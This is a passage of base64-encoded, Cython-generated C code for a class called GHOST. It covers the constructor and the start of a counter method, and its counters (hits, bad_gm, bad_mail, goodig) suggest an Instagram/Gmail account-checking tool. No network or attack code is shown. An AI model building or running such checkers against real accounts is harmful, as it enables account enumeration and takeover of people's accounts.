S0+X19weXhfZW1wdHlfdW5pY29kZSk7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCk7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIpO1xuICBmb3IgKGludCBpPTA7IGk8MTsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfc2xpY2VbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwyMzsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHVwbGVbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwyMTsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY29kZW9ial90YWJbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTw0NjQ7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTw0MzsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfbnVtYmVyX3RhYltpXSk7IH1cblxuXG5QeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSk7XG5cblxuUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSk7XG5cblxuUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlKTtcblxuXG5yZXR1cm4gMDtcbn1cbiNlbmRpZlxuXG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xX19pbml0X18oUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF8xX19pbml0X18gPSB7Il9faW5pdF9fIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzFfX2luaXRfXywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8xX19pbml0X18oUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19pbml0X18gKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlbGYsMH07XG4gICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7XG4gICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCA0OSwgX19weXhfTDNfZXJyb3IpXG4gICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDQ5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiX19pbml0X18iLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJfX2luaXRfXyIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgNDksIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICB9XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkge1xuICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICB9IGVsc2Uge1xuICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNDksIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJfX2luaXRfXyIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDQ5LCBfX3B5eF9MM19lcnJvcilcbiAgX19weXhfTDZfc2tpcDo7XG4gIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7XG4gIF9fcHl4X0wzX2Vycm9yOjtcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULl9faW5pdF9fIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMnR0XzVHSE9TVF9fX2luaXRfXyhfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYpO1xuXG4gIFxuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7XG4gICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pO1xuICB9XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ydHRfNUdIT1NUX19faW5pdF9fKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfNTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19pbml0X18iLCAwKTtcblxuICBcbiAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG9rZW4sIFB5X05vbmUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VyX2lkLCBQeV9Ob25lKSA8ICgwKSkgX19QWVhfRVJSKDAsIDUxLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA1MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEsIF9fcHl4X3RfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA1MiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV95eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F6ZXJ0eXVpb3BtbGtqaGdmZHNxd3hjdmJuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDUzLCBfX3B5eF9MMV9lcnJvcilcblxuICBcbiAgX19weXhfdF8xID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdG90YWwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkX21haWwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dvb2RpZywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0wxX2Vycm9yKVxuICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FjdGl2ZV90aHJlYWRzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDFfZXJyb3IpXG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9maWx0ZXJlZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0wxX2Vycm9yKVxuXG4gIFxuICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb3VudGVyLCBfX3B5eF90XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgNTQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJlYWRpbmcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA2NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0xvY2spOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA2NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgX19weXhfdF81ID0gMTtcbiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHtcbiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgIGFzc2VydChfX3B5eF90XzIpO1xuICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICBfX3B5eF90XzUgPSAwO1xuICB9XG4gICNlbmRpZlxuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgTlVMTH07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoKFB5T2JqZWN0KilfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDY0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgfVxuICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2NrLCBfX3B5eF90XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgNjQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcblxuICBcbiAgaWYgKF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcnVubmluZywgUHlfVHJ1ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA2NSwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIGdvdG8gX19weXhfTDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpO1xuICBfX1B5eF9BZGRUcmFjZWJhY2soInR0LkdIT1NULl9faW5pdF9fIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX3B5eF9MMDo7XG4gIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpO1xuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8zaW5jcmVtZW50X2NvdW50ZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMnR0XzVHSE9TVF8zaW5jcmVtZW50X2NvdW50ZXIgPSB7ImluY3JlbWVudF9jb3VudGVyIiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ydHRfNUdIT1NUXzNpbmNyZW1lbnRfY291bnRlciwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnR0XzVHSE9TVF8zaW5jcmVtZW50X2NvdW50ZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3Zfa2V5ID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTtcbiAgaW50IF9fcHl4X2xpbmVubyA9IDA7XG4gIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDtcbiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwO1xuICBQeU9iamVjdCAqX19weXhfciA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJpbmNyZW1lbnRfY291bnRlciAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2tleSwwfTtcbiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDtcbiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDY3LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDI6XG4gICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5